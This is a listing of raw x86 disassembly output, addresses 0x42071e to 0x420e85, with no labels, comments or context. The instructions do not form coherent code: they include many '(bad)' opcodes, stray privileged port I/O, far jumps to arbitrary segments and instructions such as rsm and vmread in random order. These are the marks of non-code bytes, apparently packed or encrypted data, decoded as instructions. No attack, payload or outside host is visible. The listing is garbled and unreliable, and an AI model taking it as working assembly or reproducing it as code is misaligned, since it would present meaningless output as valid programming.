  42071e:	mov    ch,0xd0
  420720:	cmp    ah,bl
  420722:	pop    edi
  420723:	dec    ebx
  420724:	or     eax,ecx
  420726:	outs   dx,DWORD PTR ds:[esi]
  420727:	cmp    al,0x96
  420729:	loopne 0x42072a
  42072b:	mov    esi,0xf41f7b2d
  420730:	lea    esp,[ebp-0x6519764f]
  420736:	sbb    DWORD PTR [ebp+0x5e8a8f2c],ebp
  42073c:	sub    eax,0x12a315f
  420741:	in     eax,0x70
  420743:	mov    eax,0x615dd3c1
  420748:	enter  0xb3e5,0xeb
  42074c:	cli    
  42074d:	mov    ?,WORD PTR [ebp-0x7]
  420750:	lahf   
  420751:	jno    0x42078a
  420753:	mov    DWORD PTR [ebx-0x7ce09deb],edi
  420759:	mov    esp,0xd8bc6f30
  42075e:	cmp    DWORD PTR [eax-0x38],0x22
  420762:	dec    edi
  420763:	sbb    BYTE PTR [ebx-0x1e],cl
  420766:	imul   edi,esi,0x71bbd51c
  42076c:	addr16 pop ebx
  42076e:	out    dx,eax
  42076f:	mov    edi,0xc37a9911
  420774:	adc    eax,0x7210664d
  420779:	fdivr  QWORD PTR [ebp+0x1b]
  42077c:	pop    esp
  42077d:	out    dx,al
  42077e:	dec    esi
  42077f:	fmul   st,st(0)
  420781:	mov    al,0x4f
  420783:	sbb    BYTE PTR [edx-0x5b],ah
  420786:	or     edi,ebp
  420788:	arpl   WORD PTR [ebp-0x68],di
  42078b:	out    0xb3,eax
  42078d:	sub    bl,al
  42078f:	xchg   ebx,eax
  420790:	pop    ebp
  420791:	cmp    DWORD PTR [esi+0x7a0b11ed],edi
  420797:	lds    esi,FWORD PTR [ecx]
  420799:	das    
  42079a:	mov    esi,0x3a3d38c3
  42079f:	xor    DWORD PTR [edi-0x42],ebp
  4207a2:	fwait
  4207a3:	push   eax
  4207a4:	xor    al,0xa0
  4207a6:	ret    
  4207a7:	pop    edi
  4207a8:	bound  ebx,QWORD PTR [ecx]
  4207aa:	mov    dh,0x4b
  4207ac:	adc    dh,bh
  4207ae:	adc    BYTE PTR [ecx+0x58],dl
  4207b1:	dec    esp
  4207b2:	(bad)  
  4207b4:	stos   BYTE PTR es:[edi],al
  4207b5:	push   edx
  4207b6:	cli    
  4207b7:	js     0x420801
  4207b9:	(bad)  
  4207ba:	jae    0x42074b
  4207bc:	gs push ss
  4207be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207bf:	aas    
  4207c0:	ret    
  4207c1:	jle    0x420787
  4207c3:	js     0x4207a4
  4207c5:	mov    bh,0xeb
  4207c7:	mov    eax,0x6e6fa5bb
  4207cc:	ss clc 
  4207ce:	lods   eax,DWORD PTR ds:[esi]
  4207cf:	call   0xf915:0x501bf5a2
  4207d6:	ficom  WORD PTR [ecx+0x4a]
  4207d9:	ror    DWORD PTR [edx-0xd637672],0x4b
  4207e0:	mov    dl,0x1c
  4207e2:	mov    bh,bl
  4207e4:	into   
  4207e5:	push   ecx
  4207e6:	and    eax,0x2af6b784
  4207eb:	dec    ebx
  4207ec:	in     eax,0x61
  4207ee:	loopne 0x420815
  4207f0:	sti    
  4207f1:	mov    cl,0x21
  4207f3:	in     al,dx
  4207f4:	test   al,0x8b
  4207f6:	in     eax,0x3c
  4207f8:	(bad)  
  4207f9:	ffree  st(3)
  4207fb:	(bad)  
  4207fc:	cwde   
  4207fd:	icebp  
  4207fe:	frndint 
  420800:	mov    ebp,0xd6eb437c
  420805:	push   0x44
  420807:	mov    ch,BYTE PTR [ecx]
  420809:	outs   dx,DWORD PTR ds:[esi]
  42080a:	jmp    0x9e5d:0x1f01f9e9
  420811:	data16 xor BYTE PTR [ecx-0x24],ch
  420815:	inc    esp
  420816:	ins    DWORD PTR es:[edi],dx
  420817:	inc    ebx
  420818:	in     al,0x7f
  42081a:	mov    cl,0xe6
  42081c:	stos   DWORD PTR es:[edi],eax
  42081d:	xchg   edx,eax
  42081e:	int    0xd0
  420820:	fs pop edx
  420822:	dec    ecx
  420823:	aas    
  420824:	jae    0xfa84404b
  42082a:	leave  
  42082b:	mov    dl,0x71
  42082d:	fmul   QWORD PTR [eax]
  42082f:	fwait
  420830:	daa    
  420831:	(bad)  
  420832:	mov    edx,0x8c43958
  420837:	das    
  420838:	outs   dx,DWORD PTR ds:[esi]
  420839:	ja     0x420844
  42083b:	xor    bl,BYTE PTR [bx+di]
  42083e:	arpl   WORD PTR [esi+0x3aa4db57],cx
  420844:	xor    bl,BYTE PTR [edx]
  420846:	lods   al,BYTE PTR ds:[esi]
  420847:	mov    BYTE PTR [esi-0x78],bh
  42084a:	add    DWORD PTR [eax+0x37],edi
  42084d:	pop    edi
  42084e:	jno    0x420866
  420850:	cs cld 
  420852:	iret   
  420853:	mov    esp,0x389fc6c0
  420858:	dec    edx
  420859:	aas    
  42085a:	add    al,0x3b
  42085c:	push   ebp
  42085d:	outs   dx,BYTE PTR ds:[esi]
  42085e:	mov    ebx,0x2a466768
  420863:	scas   eax,DWORD PTR es:[edi]
  420864:	mov    bh,0x4d
  420866:	lods   eax,DWORD PTR ds:[esi]
  420867:	ss dec ebp
  420869:	pop    ss
  42086a:	push   DWORD PTR [ebx-0x30]
  42086d:	xchg   esi,eax
  42086e:	mov    al,0x29
  420870:	inc    esp
  420871:	daa    
  420872:	(bad)  
  420873:	cmp    BYTE PTR [esi-0x2d],ch
  420876:	test   BYTE PTR [edi],al
  420878:	mov    al,ds:0x873bb1ca
  42087d:	push   ecx
  42087e:	out    dx,eax
  42087f:	ds pop edi
  420881:	ds cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  420884:	imul   ebp,DWORD PTR [ebp-0x55cb1810],0x406f4386
  42088e:	arpl   WORD PTR [ebx],cx
  420890:	mov    ds,WORD PTR [ebx-0x30]
  420893:	ficomp DWORD PTR [ecx-0x1e94b76b]
  420899:	sub    al,BYTE PTR [ebp-0x52]
  42089c:	adc    ebx,esp
  42089e:	aam    0xc9
  4208a0:	pop    esp
  4208a1:	dec    esi
  4208a2:	icebp  
  4208a3:	mov    dl,BYTE PTR [edx+0x4efdac97]
  4208a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208aa:	push   esi
  4208ab:	mov    edi,DWORD PTR [ebp+0x51]
  4208ae:	in     eax,0xab
  4208b0:	xchg   BYTE PTR [eax+0x249702f],ch
  4208b6:	xchg   ecx,eax
  4208b7:	cmc    
  4208b8:	aaa    
  4208b9:	ja     0x42085b
  4208bb:	bound  ebp,QWORD PTR ds:0xa99aca5b
  4208c1:	pop    ebx
  4208c2:	mov    ah,0xa8
  4208c4:	add    eax,0x92369e29
  4208c9:	xor    al,0xc3
  4208cb:	push   edi
  4208cc:	ins    BYTE PTR es:[edi],dx
  4208cd:	mov    dl,0x49
  4208cf:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d1:	(bad)
  4208d5:	push   esi
  4208d6:	fstp   TBYTE PTR es:[ecx+0x73]
  4208da:	data16 aas 
  4208dc:	add    BYTE PTR [esi],ch
  4208de:	mov    cl,0xa3
  4208e0:	mov    edx,0x3605b602
  4208e5:	cmp    ebp,DWORD PTR [ebx-0x6a]
  4208e8:	daa    
  4208e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ea:	mov    esp,0x67c3f99f
  4208ef:	jo     0x4208ac
  4208f1:	(bad)  
  4208f3:	jns    0x42094a
  4208f5:	ins    DWORD PTR es:[edi],dx
  4208f6:	mov    dh,0x8
  4208f8:	leave  
  4208f9:	or     ah,dl
  4208fb:	xchg   esi,eax
  4208fc:	inc    ebp
  4208fd:	lds    eax,FWORD PTR ds:0xa907440e
  420903:	lds    edi,FWORD PTR [bx+0x6b]
  420907:	in     eax,dx
  420908:	mov    ebx,0xc3d90c47
  42090d:	add    al,0x7b
  42090f:	inc    edi
  420910:	xlat   BYTE PTR ds:[ebx]
  420911:	xor    bl,BYTE PTR [ecx-0x7]
  420914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420915:	mov    ds:0x4404a354,eax
  42091a:	cld    
  42091b:	inc    ebp
  42091c:	addr16 hlt 
  42091e:	push   0xffffff8b
  420920:	dec    esi
  420921:	and    al,0xfd
  420923:	out    dx,al
  420924:	pop    ebp
  420925:	push   edx
  420926:	stc    
  420927:	lahf   
  420928:	cdq    
  420929:	add    eax,0xf9d42b6c
  42092e:	mov    cl,0x68
  420930:	in     al,0x6e
  420932:	add    dl,BYTE PTR [ecx]
  420934:	fwait
  420935:	push   esi
  420936:	(bad)  
  420937:	mov    dl,0xc7
  420939:	call   0x40f26d90
  42093e:	xor    DWORD PTR [eax+0x1f33f1dd],ebp
  420944:	xchg   edx,eax
  420945:	and    DWORD PTR [esi],0x6ddd5a60
  42094b:	mov    bh,0x88
  42094d:	or     BYTE PTR [ecx+0x7f],0xf0
  420951:	pop    es
  420952:	ret    
  420953:	sahf   
  420954:	stos   BYTE PTR es:[edi],al
  420955:	push   ecx
  420956:	dec    ecx
  420957:	jb     0x42099f
  420959:	dec    edi
  42095a:	push   0x67c24ea1
  42095f:	aam    0xbb
  420961:	inc    ebx
  420962:	pusha  
  420963:	outs   dx,BYTE PTR ds:[esi]
  420964:	jne    0x420975
  420966:	shl    BYTE PTR [eax+0x1d],1
  420969:	mov    al,0x22
  42096b:	mov    ah,0xe9
  42096d:	popf   
  42096e:	pop    ecx
  42096f:	nop
  420970:	add    ah,dl
  420972:	pushf  
  420973:	jmp    0x350f:0x23b6639e
  42097a:	push   esi
  42097b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42097c:	xchg   DWORD PTR [ecx],esp
  42097e:	das    
  42097f:	jbe    0x420925
  420981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420982:	(bad)  
  420983:	xor    ecx,edi
  420985:	adc    DWORD PTR [ecx-0x21825684],0xffffffc9
  42098c:	fild   WORD PTR [eax+0x2e4a1a2a]
  420992:	add    bh,BYTE PTR [ebx]
  420994:	mov    al,cl
  420996:	sbb    ebp,eax
  420998:	call   0xa72daba4
  42099d:	lds    sp,DWORD PTR [edx+0x1f855064]
  4209a4:	aam    0x9f
  4209a6:	sbb    bh,ah
  4209a8:	push   esi
  4209a9:	pop    ds
  4209aa:	add    eax,DWORD PTR [edi-0x5c]
  4209ad:	in     eax,0x67
  4209af:	loope  0x4209c0
  4209b1:	out    dx,eax
  4209b2:	icebp  
  4209b3:	sbb    edx,DWORD PTR [esi-0x76]
  4209b6:	xchg   edi,eax
  4209b7:	adc    BYTE PTR [edx],ah
  4209b9:	enter  0xb9de,0x15
  4209bd:	cmc    
  4209be:	push   edx
  4209bf:	ins    DWORD PTR es:[edi],dx
  4209c0:	cli    
  4209c1:	jle    0x420a1f
  4209c3:	pop    ecx
  4209c4:	rsm    
  4209c6:	sbb    eax,0xf8da24b3
  4209cb:	push   esp
  4209cc:	xor    al,0x86
  4209ce:	in     al,0xfd
  4209d0:	cwde   
  4209d1:	push   esi
  4209d2:	jae    0x4209c0
  4209d4:	cmp    DWORD PTR [edi],esi
  4209d6:	cmp    BYTE PTR [edi+0x3c],ah
  4209d9:	clc    
  4209da:	dec    edx
  4209db:	fsubr  DWORD PTR [ebp-0xb89078f]
  4209e2:	sub    ebx,DWORD PTR [ecx+0x67]
  4209e5:	out    0x2f,al
  4209e7:	sbb    al,0xd2
  4209e9:	ss ja  0x420a1d
  4209ec:	daa    
  4209ed:	les    ecx,FWORD PTR [eax-0x2009deef]
  4209f3:	pop    es
  4209f4:	js     0x4209e7
  4209f6:	cmp    ebx,edx
  4209f8:	mov    ebx,DWORD PTR [ebx+0x40]
  4209fb:	mov    bl,0x32
  4209fd:	dec    ebx
  4209fe:	mov    WORD PTR [eax],?
  420a00:	cwde   
  420a01:	pop    ss
  420a02:	adc    BYTE PTR [esi-0x65],ah
  420a05:	sbb    dh,cl
  420a07:	pop    es
  420a08:	leave  
  420a09:	xchg   edi,eax
  420a0a:	pop    ebx
  420a0b:	mov    DWORD PTR [ebx],ebp
  420a0d:	xchg   edi,eax
  420a0e:	(bad)  
  420a0f:	das    
  420a10:	shl    BYTE PTR [eax],cl
  420a12:	gs loopne 0x4209d3
  420a15:	adc    ah,BYTE PTR [ecx+edx*2+0x2b33669c]
  420a1c:	lods   al,BYTE PTR ds:[esi]
  420a1d:	dec    edi
  420a1e:	out    dx,al
  420a1f:	hlt    
  420a20:	fidivr WORD PTR es:[eax+edi*2-0x5e34cfa6]
  420a28:	test   ah,dl
  420a2a:	clc    
  420a2b:	or     eax,0x8d1149c0
  420a30:	cmp    ebp,esi
  420a32:	imul   ecx,DWORD PTR [edx-0x1c],0xa008da1c
  420a39:	fmul   QWORD PTR [esi]
  420a3b:	push   esp
  420a3c:	pop    eax
  420a3d:	mov    cl,0x54
  420a3f:	not    BYTE PTR [ebx]
  420a41:	jmp    0x420a2a
  420a43:	into   
  420a44:	sbb    BYTE PTR [ecx],ah
  420a46:	xor    esi,esp
  420a48:	in     al,dx
  420a49:	es pop ebx
  420a4b:	inc    ebx
  420a4c:	xchg   ebp,eax
  420a4d:	dec    esp
  420a4e:	pop    ecx
  420a4f:	aam    0x3c
  420a51:	call   0xe231f158
  420a56:	std    
  420a57:	ss scas al,BYTE PTR es:[edi]
  420a59:	in     al,0xb9
  420a5b:	jl     0x420a1a
  420a5d:	shl    BYTE PTR [edi-0x30],1
  420a60:	(bad)  
  420a61:	cmp    dl,ah
  420a63:	push   ss
  420a64:	jmp    0x420a66
  420a66:	sbb    BYTE PTR [ebx+ebp*1-0x21],dl
  420a6a:	jo     0x420a04
  420a6c:	jbe    0x420a4a
  420a6e:	push   0xffffffcf
  420a70:	inc    esp
  420a71:	and    ah,BYTE PTR [edi+eiz*8]
  420a74:	jnp    0x420a78
  420a76:	mov    edi,0xd079d432
  420a7b:	test   BYTE PTR [edx],0x60
  420a7e:	pop    esp
  420a7f:	pop    ecx
  420a80:	pop    es
  420a81:	leave  
  420a82:	xor    eax,0xaa24b6bb
  420a87:	mov    edi,0x2ad81df1
  420a8c:	xor    eax,0x33475fb5
  420a91:	hlt    
  420a92:	gs dec ebp
  420a94:	cmc    
  420a95:	inc    ebx
  420a96:	xor    ebx,DWORD PTR [esi-0x6b]
  420a99:	inc    edx
  420a9a:	mov    al,ds:0xe0e68f57
  420a9f:	push   es
  420aa0:	repz push ds
  420aa2:	mov    ecx,0x90d4972d
  420aa7:	lods   eax,DWORD PTR ds:[esi]
  420aa8:	inc    esp
  420aa9:	stc    
  420aaa:	loop   0x420a7b
  420aac:	mov    ah,BYTE PTR [esi+edi*1]
  420aaf:	fld    TBYTE PTR [edx+0x6e209a2a]
  420ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ab6:	xchg   edx,eax
  420ab7:	iret   
  420ab8:	ds pop edi
  420aba:	mov    ebp,0xe90b25b9
  420abf:	pop    ss
  420ac0:	leave  
  420ac1:	xor    DWORD PTR [edi],ecx
  420ac3:	sbb    edi,DWORD PTR [eax-0x60048095]
  420ac9:	sub    BYTE PTR [esi-0x49ef922f],cl
  420acf:	hlt    
  420ad0:	add    al,0x90
  420ad2:	pop    ebx
  420ad3:	aas    
  420ad4:	ret    0xa58d
  420ad7:	push   ss
  420ad8:	lds    ecx,FWORD PTR [ecx]
  420ada:	mov    dh,0xba
  420adc:	popf   
  420add:	add    DWORD PTR [edx],ebx
  420adf:	pop    edi
  420ae0:	jmp    0xec960974
  420ae5:	xchg   ecx,eax
  420ae6:	mov    esi,0xbec1004b
  420aeb:	mov    ah,0x2b
  420aed:	lahf   
  420aee:	jns    0x420aa5
  420af0:	ret    
  420af1:	xchg   ebx,eax
  420af2:	dec    DWORD PTR [ecx+0x64]
  420af5:	fcomp  DWORD PTR es:[eax-0x6d0099d2]
  420afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420afd:	pslld  mm0,QWORD PTR [ecx]
  420b00:	test   al,0x87
  420b02:	dec    esp
  420b03:	ret    0xe15e
  420b06:	pop    ds
  420b07:	out    dx,eax
  420b08:	jmp    0x90f743b3
  420b0d:	adc    DWORD PTR [ecx+ebp*2+0x7b],ebx
  420b11:	push   ds
  420b12:	xlat   BYTE PTR ds:[ebx]
  420b13:	jns    0x420b2d
  420b15:	popa   
  420b16:	pop    ds
  420b17:	pop    edi
  420b18:	fs aad 0xc3
  420b1b:	fwait
  420b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b1d:	stc    
  420b1e:	(bad)  
  420b20:	sub    ch,BYTE PTR [edi+edx*8+0x788cb83]
  420b27:	and    DWORD PTR [edi+eiz*4],0xffffffd0
  420b2b:	add    BYTE PTR [edi],al
  420b2d:	fwait
  420b2e:	pusha  
  420b2f:	(bad)  
  420b30:	ja     0x420b3d
  420b32:	sbb    bl,dl
  420b34:	dec    esp
  420b35:	adc    eax,0x1b7d9fde
  420b3a:	popa   
  420b3b:	outs   dx,BYTE PTR ds:[esi]
  420b3c:	mov    dl,0x96
  420b3e:	mov    ecx,DWORD PTR [esi]
  420b40:	jle    0x420ae7
  420b42:	scas   al,BYTE PTR es:[edi]
  420b43:	rcl    BYTE PTR [edi],0x78
  420b46:	xor    esi,DWORD PTR [ebx]
  420b48:	in     al,dx
  420b49:	popa   
  420b4a:	sub    al,0x76
  420b4c:	and    DWORD PTR [ebp+0x68],edx
  420b4f:	mov    ch,0x7a
  420b51:	mov    dh,0x41
  420b53:	or     ecx,DWORD PTR [edx]
  420b55:	mov    bl,0x45
  420b57:	test   BYTE PTR [edx],dl
  420b59:	or     al,0xc7
  420b5b:	sub    eax,0xff18d0b7
  420b60:	lock sar ebp,cl
  420b63:	push   ecx
  420b64:	mov    cl,0x54
  420b66:	lock aam 0x40
  420b69:	cwde   
  420b6a:	ret    0xf66d
  420b6d:	dec    edx
  420b6e:	mov    esi,0xb8777472
  420b73:	jns    0x420bdd
  420b75:	ficom  WORD PTR [eax-0x7f]
  420b78:	dec    ebx
  420b79:	inc    esi
  420b7a:	jno    0x420be4
  420b7c:	fs dec eax
  420b7e:	fucomi st,st(5)
  420b80:	outs   dx,DWORD PTR ds:[esi]
  420b81:	es push ds
  420b83:	add    al,0xca
  420b85:	retf   0x12ac
  420b88:	pushf  
  420b89:	enter  0x22c9,0x29
  420b8d:	pop    ds
  420b8e:	push   0x1c286e04
  420b93:	iret   
  420b94:	fwait
  420b95:	mov    esp,edx
  420b97:	test   DWORD PTR ds:0x48d50a80,esi
  420b9d:	mov    DWORD PTR [edx+edx*1+0x729996ef],edi
  420ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ba5:	out    0xdd,eax
  420ba7:	mov    WORD PTR [ecx],es
  420ba9:	out    dx,eax
  420baa:	sub    ecx,edx
  420bac:	pushf  
  420bad:	bound  ebp,QWORD PTR [edx]
  420baf:	push   ds
  420bb0:	pop    eax
  420bb1:	retf   
  420bb2:	sub    eax,0x3acc9286
  420bb7:	xchg   ebx,eax
  420bb8:	cvtdq2ps xmm6,XMMWORD PTR [ebx]
  420bbb:	mov    edx,0x6a94b61f
  420bc0:	adc    edi,DWORD PTR [ebx]
  420bc2:	test   DWORD PTR cs:[esi+0x699ea0f9],ebx
  420bc9:	push   ss
  420bca:	ins    DWORD PTR es:[edi],dx
  420bcb:	fwait
  420bcc:	jo     0x420c23
  420bce:	popa   
  420bcf:	scas   al,BYTE PTR es:[edi]
  420bd0:	sbb    BYTE PTR [ebp+0x2c],al
  420bd3:	mov    cl,0xf9
  420bd5:	(bad)
  420bd8:	(bad)  
  420bd9:	pop    edi
  420bda:	inc    ebp
  420bdb:	pop    ebp
  420bdc:	lea    ebx,[ecx]
  420bde:	push   ss
  420bdf:	lahf   
  420be0:	dec    esi
  420be1:	push   0xfd05486d
  420be6:	ficomp WORD PTR [edx+0x4b920925]
  420bec:	pop    es
  420bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bee:	jle    0x420c02
  420bf0:	inc    ebx
  420bf1:	mov    al,ds:0xb0ec2567
  420bf6:	rcl    DWORD PTR gs:[ebp+ebp*4-0x7956387],1
  420bfe:	push   edi
  420bff:	cmp    DWORD PTR [ebp+0x23051507],eax
  420c05:	sbb    BYTE PTR ds:0x954482d1,dl
  420c0b:	xchg   ebx,eax
  420c0c:	int3   
  420c0d:	sbb    dh,BYTE PTR [edi+0x27]
  420c10:	stc    
  420c11:	mov    cl,0x1d
  420c13:	rcl    DWORD PTR [edi],1
  420c15:	mov    bh,0x3d
  420c17:	ss and ebx,eax
  420c1a:	loop   0x420baa
  420c1c:	popa   
  420c1d:	add    eax,0x7fd99196
  420c22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c23:	inc    ebx
  420c24:	mov    bh,0x17
  420c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c27:	stos   DWORD PTR es:[edi],eax
  420c28:	jmp    0xfd09:0xf72d526f
  420c2f:	dec    ebp
  420c30:	pushf  
  420c31:	cmp    al,0xd4
  420c33:	iret   
  420c34:	loopne 0x420c09
  420c36:	repnz cmc 
  420c38:	mov    edx,ebp
  420c3a:	mov    WORD PTR [ebp+0x62386c8b],?
  420c40:	ss inc esi
  420c42:	iret   
  420c43:	push   esi
  420c44:	fbld   TBYTE PTR [ebp-0x760200c4]
  420c4a:	pop    ss
  420c4b:	lea    edx,ds:0x176b1994
  420c51:	js     0x420cb8
  420c53:	xchg   ecx,eax
  420c54:	pop    edi
  420c55:	jl     0x420cc1
  420c57:	popa   
  420c58:	xlat   BYTE PTR ds:[ebx]
  420c59:	int    0x31
  420c5b:	int3   
  420c5c:	inc    esi
  420c5d:	inc    esi
  420c5e:	add    edi,esi
  420c60:	push   0x810fdf17
  420c65:	mov    edx,0xe6b1e11b
  420c6a:	out    dx,al
  420c6b:	mov    cs,WORD PTR [esi-0x5f1eeec9]
  420c71:	rcr    BYTE PTR [esi-0x4f],1
  420c74:	cmc    
  420c75:	cmc    
  420c76:	call   0xdced27cf
  420c7b:	loopne 0x420c88
  420c7d:	stc    
  420c7e:	dec    esi
  420c7f:	pop    ebp
  420c80:	sbb    BYTE PTR [ebx+0x76],dh
  420c83:	add    ecx,ecx
  420c85:	mov    cl,0x58
  420c87:	ret    0xb46e
  420c8a:	dec    ebp
  420c8b:	rcl    BYTE PTR [edx+0x4b238a52],1
  420c91:	mov    ch,BYTE PTR [edi+edi*2]
  420c94:	jns    0x420c8b
  420c96:	inc    edi
  420c97:	dec    ebx
  420c98:	fld    DWORD PTR [ecx-0x13]
  420c9b:	xor    eax,0x2fbc1851
  420ca0:	fcomp  QWORD PTR [ebp+0x13]
  420ca3:	iret   
  420ca4:	arpl   WORD PTR [edx],bp
  420ca6:	jns    0x420d22
  420ca8:	loop   0x420c52
  420caa:	xchg   esp,eax
  420cab:	and    al,0x26
  420cad:	cmp    BYTE PTR [ecx+0x41b006e3],bl
  420cb3:	test   BYTE PTR ds:[edx+esi*2-0x31],ah
  420cb8:	lods   al,BYTE PTR ds:[esi]
  420cb9:	or     eax,0xe1f7ab10
  420cbe:	push   cs
  420cbf:	fcompp 
  420cc1:	call   0xc06:0xaeb634a8
  420cc8:	mov    cl,0x1b
  420cca:	dec    esp
  420ccb:	mov    eax,ds:0xf39501fd
  420cd0:	out    dx,al
  420cd1:	or     eax,0x9010692d
  420cd7:	repz jbe 0x420cf5
  420cda:	mov    ebx,0x1fa4e3f4
  420cdf:	sqrtps xmm3,XMMWORD PTR [ebp+0x50fe274e]
  420ce6:	add    eax,0xe8a81282
  420ceb:	mov    gs,WORD PTR [ecx-0x320a25dc]
  420cf1:	pop    ss
  420cf2:	repz sub esi,DWORD PTR [esi-0x77]
  420cf6:	or     dl,BYTE PTR [ecx-0x5b0ff9be]
  420cfc:	leave  
  420cfd:	jb     0x420d02
  420cff:	mov    bl,0x71
  420d01:	gs inc esi
  420d03:	adc    DWORD PTR [esp+ecx*2],ebx
  420d06:	fild   WORD PTR [esi-0x5e701bd0]
  420d0c:	in     al,0x72
  420d0e:	daa    
  420d0f:	div    BYTE PTR [edi+eax*1+0x5d]
  420d13:	push   ds
  420d14:	adc    eax,0xfd8d4ba3
  420d19:	adc    eax,0xd9cc3af9
  420d1e:	pop    ss
  420d1f:	hlt    
  420d20:	jbe    0x420d0d
  420d22:	inc    ebx
  420d23:	out    0xab,eax
  420d25:	jno    0x420d32
  420d27:	push   esi
  420d28:	repnz nop
  420d2a:	push   es
  420d2b:	cwde   
  420d2c:	push   ebp
  420d2d:	cmp    cl,BYTE PTR [esi-0x75]
  420d30:	push   ebp
  420d31:	mov    eax,0x2349e9
  420d36:	add    BYTE PTR ds:0xe7c03733,ch
  420d3c:	fsub   QWORD PTR [ebp-0x7d]
  420d3f:	(bad)  [esi-0x53]
  420d42:	jle    0x420d97
  420d44:	out    0x30,eax
  420d46:	or     eax,edx
  420d48:	mov    bh,0x61
  420d4a:	bound  edx,QWORD PTR [ecx+0x5f]
  420d4d:	bound  esp,QWORD PTR [edx-0xf]
  420d50:	push   edi
  420d51:	xchg   BYTE PTR [edi+0x7f],bl
  420d54:	out    dx,eax
  420d55:	dec    ebx
  420d56:	shl    DWORD PTR [ecx],1
  420d58:	or     al,0xf9
  420d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d5b:	pop    eax
  420d5c:	mov    dl,0x6b
  420d5e:	fcom   QWORD PTR [ebx]
  420d60:	call   0x5cfc:0x6590e
  420d67:	jno    0x420d21
  420d69:	and    BYTE PTR [eax-0x519007d4],ah
  420d6f:	dec    eax
  420d70:	jae    0x420d19
  420d72:	es push edx
  420d74:	shl    edx,0xc4
  420d77:	ja     0x420d23
  420d79:	pop    edi
  420d7a:	push   ebx
  420d7b:	inc    ebx
  420d7c:	pushf  
  420d7d:	or     dl,BYTE PTR [esi]
  420d7f:	scas   eax,DWORD PTR es:[edi]
  420d80:	jns    0x420d18
  420d82:	xor    DWORD PTR [ebp+ecx*8+0x34982031],ecx
  420d89:	sbb    BYTE PTR [edx+0x7d],dh
  420d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d8d:	jmp    0xcebeca0a
  420d92:	xor    cl,0x8a
  420d95:	outs   dx,BYTE PTR ds:[esi]
  420d96:	adc    al,0xe3
  420d98:	out    0xd5,al
  420d9a:	and    dh,bl
  420d9c:	loope  0x420d44
  420d9e:	lock popa 
  420da0:	pop    ss
  420da1:	sub    dl,BYTE PTR [esi]
  420da3:	xchg   ebx,eax
  420da4:	dec    eax
  420da5:	xor    al,0x3d
  420da7:	or     al,0xe8
  420da9:	xor    ch,ch
  420dab:	mov    ebp,0x4e596e7f
  420db0:	add    DWORD PTR es:[ecx],edi
  420db3:	and    esp,0xffffff80
  420db6:	stos   DWORD PTR es:[edi],eax
  420db7:	mov    edi,0xa6e65168
  420dbc:	pop    edx
  420dbd:	stos   BYTE PTR es:[edi],al
  420dbe:	dec    ebp
  420dbf:	inc    ebx
  420dc0:	lock fucom st(1)
  420dc3:	push   es
  420dc4:	enter  0x841,0x1c
  420dc8:	rol    DWORD PTR [ecx-0x4d],0x2a
  420dcc:	cmp    cl,BYTE PTR [ebp+edx*8-0x1184c34d]
  420dd3:	mov    BYTE PTR [edx+0x3e],ch
  420dd6:	mov    edi,0x507af6a0
  420ddb:	cmp    eax,0xa07d4bf5
  420de0:	xor    eax,0xe5c3018b
  420de5:	xchg   ecx,eax
  420de6:	push   ss
  420de7:	inc    ebp
  420de8:	jns    0x420e59
  420dea:	shr    eax,1
  420dec:	push   0xf8e5075d
  420df1:	xor    eax,ebp
  420df3:	stos   BYTE PTR es:[edi],al
  420df4:	or     al,0x1b
  420df6:	int    0x16
  420df8:	mov    ecx,0x7c7142f7
  420dfd:	push   ecx
  420dfe:	sub    DWORD PTR [eax],edx
  420e00:	or     ah,BYTE PTR [ecx-0x79f43fa8]
  420e06:	push   ebx
  420e07:	xor    bl,bl
  420e09:	and    bh,BYTE PTR [edx+0x48]
  420e0c:	or     eax,0xbf3d91c7
  420e11:	sbb    BYTE PTR fs:[ebx-0x330ec75e],ah
  420e18:	vmread DWORD PTR [ecx],ebx
  420e1b:	mov    ds:0xbda376dd,eax
  420e20:	icebp  
  420e21:	mov    ds,WORD PTR [edi-0x58d29ef2]
  420e27:	out    0x42,al
  420e29:	test   eax,0x3f3df038
  420e2e:	xchg   ebp,eax
  420e2f:	adc    BYTE PTR [edx-0x5d],0x9c
  420e33:	add    al,BYTE PTR [ecx]
  420e35:	push   edi
  420e36:	ret    
  420e37:	add    bl,bl
  420e39:	cmp    ah,BYTE PTR [ebp-0x5c0f277f]
  420e3f:	stos   DWORD PTR es:[edi],eax
  420e40:	pop    ecx
  420e41:	dec    edx
  420e42:	mov    dh,dl
  420e44:	and    eax,0x3e7afe7d
  420e49:	cld    
  420e4a:	repnz fnstenv [eax]
  420e4d:	pop    ebx
  420e4e:	adc    bl,BYTE PTR [edx+0x11f97a47]
  420e54:	mov    eax,ds:0x433c2f0a
  420e59:	push   ds
  420e5a:	les    edx,FWORD PTR [ebx]
  420e5c:	inc    esi
  420e5d:	xor    DWORD PTR [edx],0x35
  420e60:	jb     0x420e2c
  420e62:	daa    
  420e63:	mov    DWORD PTR [ebx+0x5c],esp
  420e66:	jl     0x420eab
  420e68:	iret   
  420e69:	in     al,0xfa
  420e6b:	imul   esi,DWORD PTR [ebp+0x28],0x1a
  420e6f:	push   eax
  420e70:	mov    al,ds:0xddac2011
  420e75:	dec    ecx
  420e76:	or     DWORD PTR [ecx-0x20fdd349],esp
  420e7c:	jns    0x420e0f
  420e7e:	dec    esp
  420e7f:	call   0x917864f4
  420e84:	pop    edx
  420e85:	or     bh,dl
